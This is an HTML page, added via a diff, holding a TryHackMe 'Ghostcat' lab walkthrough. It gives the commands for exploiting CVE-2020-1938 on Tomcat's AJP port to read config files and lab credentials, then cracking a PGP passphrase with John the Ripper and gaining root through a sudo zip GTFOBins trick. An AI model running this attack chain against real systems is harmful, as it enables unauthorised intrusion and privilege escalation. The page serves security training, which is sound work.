@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ghostcat Walkthrough — Walkthrough</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="../css/writeups.css">
+</head>
+<body>
+    <div class="container">
+        <!-- Header -->
+        <header class="room-header">
+            <div class="emoji-row">🔍💻🚀</div>
+            <h1>Ghostcat Walkthrough</h1>
+            <p class="subtitle">TryHackMe Room Walkthrough</p>
+        </header>
+
+        <section>
+            <p>TryHackMe: Ghostcat Write-up</p>
+            <p>1. Enumeration
+  We began by scanning the target machine using nmap to identify open ports and
+  services.</p>
+            <h2>Command:</h2>
+            <p>1 nmap -sC -sV 10.81.145.17</p>
+            <p>Key Findings:
+   * Port 22: SSH (OpenSSH 7.2p2)
+   * Port 8009: AJP13 (Apache Jserv Protocol v1.3)
+   * Port 8080: HTTP (Apache Tomcat 9.0.30)</p>
+            <p>The version of Apache Tomcat (9.0.30) and the presence of the AJP connector on
+  port 8009 strongly suggested the Ghostcat (CVE-2020-1938) vulnerability.</p>
+            <p>---</p>
+            <p>2. Exploitation (Initial Access)
+  Ghostcat allows an unauthenticated attacker to read arbitrary files from the
+  web application directory via the AJP connector.</p>
+            <p>We used a Python exploit script (ajpShooter.py) to read the WEB-INF/web.xml
+  file.</p>
+            <p>Command:
+   1 python3 ajpShooter.py http://10.81.145.17:8080/ 8009 /WEB-INF/web.xml read</p>
+            <p>Results:
+  Inside the <description> tag of the XML file, we found cleartext credentials:
+   * Username: skyfuck
+   * Password: 8730281lkjlkjdqlksalks</p>
+            <p>We used these credentials to log in via SSH:
+   1 ssh skyfuck@10.81.145.17</p>
+            <p>---</p>
+            <p>3. Post-Exploitation & Lateral Movement
+  In the home directory of skyfuck, we found two interesting files:
+   1. credential.pgp: An encrypted PGP file.
+   2. tryhackme.asc: A PGP private key.</p>
+            <p>Cracking the PGP Key
+  The private key was protected by a passphrase. We transferred the files to our
+  local machine and used John the Ripper to crack it.</p>
+            <p>Commands:
+   1 gpg2john tryhackme.asc > hash.txt
+   2 john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+  The passphrase was identified as alexandru.</p>
+            <p>Decrypting the Credentials
+  Using the cracked passphrase, we imported the key and decrypted the file:
+   1 gpg --import tryhackme.asc
+   2 gpg --decrypt credential.pgp
+  This revealed the credentials for the user merlin:
+   * merlin: asuyusdoiuqhvce (example password)</p>
+            <p>We then switched to the merlin user:
+   1 su merlin</p>
+            <p>---</p>
+            <p>4. Privilege Escalation (Root)
+  After gaining access as merlin, we checked for sudo privileges.</p>
+            <p>Command:
+   1 sudo -l</p>
+            <h2>Output:</h2>
+            <p>1 User merlin may run the following commands on ubuntu:
+   2     (root : root) NOPASSWD: /usr/bin/zip</p>
+            <p>GTFOBins Exploit: Zip
+  Since zip can execute commands during its "test" phase, we used it to spawn a
+  root shell.</p>
+            <p>Command:
+   1 sudo zip /tmp/test.zip /etc/hosts -T --unzip-command="sh -c /bin/sh"</p>
+            <p>Outcome:
+  The command successfully spawned a shell as the root user.
+   * User Flag: Found in /home/merlin/user.txt
+   * Root Flag: Found in /root/root.txt</p>
+            <p>---</p>
+            <p>5. Conclusion
+  This room demonstrated:
+   1. Exploiting CVE-2020-1938: The dangers of leaving the AJP connector exposed
+      on an outdated Tomcat server.
+   2. Information Leakage: Hardcoded credentials in configuration files.
+   3. Weak PGP Passphrases: The importance of strong keys for sensitive data.
+   4. Sudo Misconfigurations: How binary "living off the land" (GTFOBins) can
+      lead to full system compromise.</p>
+
+        </section>
+    </div>
+</body>
+</html>
